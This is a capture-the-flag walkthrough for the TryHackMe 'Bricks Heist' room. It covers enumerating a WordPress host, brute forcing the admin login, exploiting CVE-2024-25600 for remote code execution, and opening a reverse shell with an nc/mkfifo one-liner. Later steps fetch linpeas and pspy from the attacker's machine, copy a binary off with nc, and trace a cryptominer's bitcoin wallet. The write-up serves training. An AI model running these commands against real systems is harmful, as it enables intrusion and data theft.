# TryHack3M: Bricks Heist - Easy

* nmap scan - ```nmap -T4 -p- -A -Pn -v 10.10.10.139``` -

  * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
  * 80/tcp - http - WebSockify Python/3.8.10
  * 443/tcp - ssl/http - Apache httpd
  * 3306/tcp - mysql - MySQL (unauthorized)

* Mapped ```bricks.thm``` to target IP in ```/etc/hosts``` as given, maybe indicates something to do with vhosts/domains

* On port 80, we get 'Error response' with error code 405 for 'Method Not Allowed'; same goes for 'bricks.thm'

* However, the HTTPS page includes the page for 'Brick by Brick'; from <https://bricks.thm>, from the favicon we can confirm it's running on WordPress. We can check the page source and get some more context.

* From the ```nmap``` scan, we also find out that on port 443, there's a ```robots.txt``` file which includes an entry for '/wp-admin/', and leads us to WordPress login page

* We can simultaneously do a directory scanning for both HTTP and HTTPS pages:

  ```sh
  gobuster dir -u http://bricks.thm -w /usr/share/dirb/wordlists/big.txt -x txt,php,html,bak -t 16

  gobuster dir -u https://bricks.thm -k -w /usr/share/dirb/wordlists/big.txt -x txt,php,html,bak -t 16
  # -k is added to ignore x509 invalid cert issues
  ```

* From directory scanning, we get a few hits - interesting folders include '/0', '/0000', 'B', '/admin' (redirect to '/wp-admin'), '/phpmyadmin'

* For these directories, we can check for any subdirectories or files:

  ```sh
  gobuster dir -u https://bricks.thm/0 -k -w /usr/share/dirb/wordlists/small.txtl -x txt,php,html,bak -t 16

  gobuster dir -u https://bricks.thm/0000 -k -w /usr/share/dirb/wordlists/small.txtl -x txt,php,html,bak -t 16
  # we get some 
  ```

* We can also try using ```wpscan``` for Wordpress enumeration:

  ```sh
  wpscan --url https://bricks.thm --enumerate --disable-tls-checks
  # xmlrpc is enabled
  # WP version 5.7
  # administrator user found
  # bricks theme being used

  wpscan --url https://bricks.thm --enumerate t --disable-tls-checks
  # to enumerate theme only

  # bruteforce for 'administrator'
  wpscan --url https://bricks.thm --disable-tls-checks --password-attack xmlrpc -t 20 -U administrator -P /usr/share/wordlists/rockyou.txt
  # no luck
  ```

* We can also check if there are other vhosts/domains:

  ```sh
  dig bricks.thm 10.10.10.139

  dig axfr @10.10.10.139 bricks.thm

  gobuster vhost -u http://bricks.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

  gobuster vhost -u https://bricks.thm -k -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
  ```

* Now, for the Bricks theme version 1.9.5 found from ```wpscan```, we get an [unauthenticated RCE exploit](https://github.com/Chocapikk/CVE-2024-25600) for versions lower than 1.9.6 - the CVE-ID associated is CVE-2024-25600:

  ```sh
  git clone https://github.com/Chocapikk/CVE-2024-25600.git

  cd CVE-2024-25600/

  pip install -r requirements.txt

  python exploit.py -u https://bricks.thm
  # we get RCE
  ```

* To move to a stable shell, we can setup a listener using ```nc -nvlp 1234``` and execute the following payload in victim machine - ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.243.37 1234 >/tmp/f``` - this gives us a reverse shell:

  ```sh
  id
  # apache

  # get a stable shell
  python -c 'import pty;pty.spawn("/bin/bash")' #to spawn a bash shell
  export TERM=xterm
  #background shell using Ctrl+Z, and in our terminal
  stty raw -echo; fg #turns echo off and foregrounds shell

  pwd

  ls
  # we have a flag here

  # we can use linpeas.sh for basic enumeration
  cd /tmp

  which wget

  wget http://10.10.243.37:8000/linpeas.sh

  chmod +x linpeas.sh

  ./linpeas.sh
  # I had to set unlimited scrolling in my terminal to view entire output
  ```

* From the given question, we need to find suspicious processes - using ```ps aux``` or ```ps -ef``` does not give anything, so we need to check using ```pspy``` as well:

  ```sh
  # on attacker machine, start server again
  # in reverse shell, fetch pspy binary

  wget http://10.10.243.37:8000/pspy64

  chmod +x pspy64

  ./pspy64
  # monitor the processes
  ```

* Using ```pspy64```, we can see that roughly every 4 minutes, a process ```/lib/NetworkManager/nm-inet-dialog``` is seen, and it is run with UID=0 (root). This is followed by it running ```uname -p``` and ```sh -c clear``` commands

* Now, to find the service associated with this process:

  ```sh
  systemctl list-units --type=service
  # this shows a service running with an interesting description

  systemctl status ubuntu.service
  # this confirms the above
  ```

* Now, to inspect this ```nm-inet-dialog``` binary further, we can transfer this file from victim to our machine:

  ```sh
  # in attacker machine
  nc -lvp 8888 > nm-inet-dialog

  # in victim machine
  cd /lib/NetworkManager

  nc 10.10.243.37 8888 -w 3 < nm-inet-dialog
  ```

* To analyze the binary in our machine, we can use ```strings nm-inet-dialog -n 8```, but this does not give much context

* As the question mentions a miner instance, we can check this file in VirusTotal for any hits

* From VirusTotal, the binary is flagged as malicious, and we can see that under 'Relations', one of the contacted domains includes <blockchain.info>; we can also confirm from 'Behavior', where highlighted text includes 'Mining'

* From the same tab, if we inspect 'Files Written', one of the files stand out - when we check this file, we can see that this is where the miner instance logged everything

* We have an ID given in this file - it seems encoded, so we can use CyberChef. It automatically decodes it From Hex, then twice from Base64

* This gives us a string - it is too lengthy to be a blockchain address. Checking further, it starts from 'bc1', which indicates 'bech32' (or Native Segwit) addresses

* In our string, we have two 'bc1' sub-strings - only one of them seems to be a valid addresses, after checking from <www.blockchain.com>

* For the valid address, we can view the addresses associated with higher BTCs transferred, and follow the paper trail; we can lookup the suspect IDs, which will show us the threat actor.
